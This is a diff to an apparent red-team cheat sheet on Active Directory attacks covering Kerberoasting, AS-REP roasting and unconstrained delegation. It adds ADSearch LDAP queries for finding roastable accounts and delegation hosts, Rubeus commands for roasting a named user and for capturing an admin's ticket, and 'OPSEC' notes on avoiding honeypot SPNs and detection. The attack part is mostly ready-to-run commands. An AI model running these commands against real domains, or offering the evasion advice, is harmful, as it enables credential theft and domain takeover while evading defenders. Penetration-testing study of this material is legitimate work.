@@ -14,7 +14,7 @@ The Kerberos session ticket as known as `TGS` has a server portion which is encr
 
 > **Note**: Service accounts are many times ignored. Password are rarely changed and have privileged access.
 
-> **RedTeam Note**: Thousands of tickets are requests, is too hard of being detected.
+> **OPSEC Note**: Thousands of tickets are requests, is too hard of being detected. Since some fake SPN (honeypot) can be available, never get all the Kerberos tickets automatically and search for some specifically.
 
 
 ### Getting the TGS
@@ -29,7 +29,10 @@ Get-NetUser -SPN
 ```powershell
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 ```
-
+* ADSearch:
+```powershell
+C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"
+```
 After enum it, we need to request a TGS:
 
 * PowerView:
@@ -92,6 +95,12 @@ PS C:\Windows\Temp\Rubeus\>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 [*] Hash written to C:\Windows\Temp\Rubeus\hashes.kerberoast
 
 [*] Roasted hashes written to : C:\Windows\Temp\Rubeus\hashes.kerberoast
+```
+
+You can also specify a user:
+
+```
+PS C:\Windows\Temp\Rubeus\>.\Rubeus.exe kerberoast /user:svcadmin /outfile:hashes.kerberoast
 ```
 ### Cracking the tickets
 
@@ -180,6 +189,10 @@ And finally same as *Kerberoasting*, you can crack the ticket with `tgsrepcrack.
 
 If a users account does not have the flag _"Do not require Kerberos pre-authentication"_ in _UserAccountControl_ settings which means kerberos preauth is disabled, it is possible to grab users AS-REP and brute-force it offline.
 
+This configuration is also enabled on the User Object and is often seen on accounts that are used on Linux Systems.
+
+> **OPSEC Notes**: Same as Kerberoasting don't run `asreproast` by itself as this will roast every account in the domain with pre-authentication not set.
+
 ### Users with No-Preauth set
 
 We need to enumerate accounts with Kerberos Preauth disabled:
@@ -192,6 +205,11 @@ Get-DomainUser -PreauthNotRequired -Verbose
 * ADModule:
 ```powershell
 Get-ADUser -Filter {DoesNotRequiredPreAuth -eq $True} -Properties DoesNotRequiredPreAuth
+```
+
+* ADSearch:
+```powershell
+C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
 ```
 
 ### Disable PreAuth
@@ -246,6 +264,11 @@ Get-NetComputer -UnConstrained
 Get-ADComputer -Filter {TrustedForDelegation -eq $True}
 Get-ADUser -Filter {TrustedForDelegation -eq $True}
 ```
+* ADSearch:
+```powershell
+C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
+```
+
 > **Note**: The **DC** always have the unconstrained delegation **enabled**.
 
 To exploit the unconstrained delgation and extract the user's TGT from lsass, we need to compromise the server as local admin.
@@ -272,7 +295,7 @@ We can abuse the printer bug if we don't want to wait for a Domain Admin to conn
 We can start listenting for new tickets with Rubeus on the server which have Unconstrained Delegation enabled.
 
 ```
-.\Rubeus.exe monitor /inverval:5 /nowrap
+.\Rubeus.exe monitor /inverval:5 /nowrap [/targetuser:admin]
 ```
 
 With the printer bug we can force the Domain Controller to connect to any server.
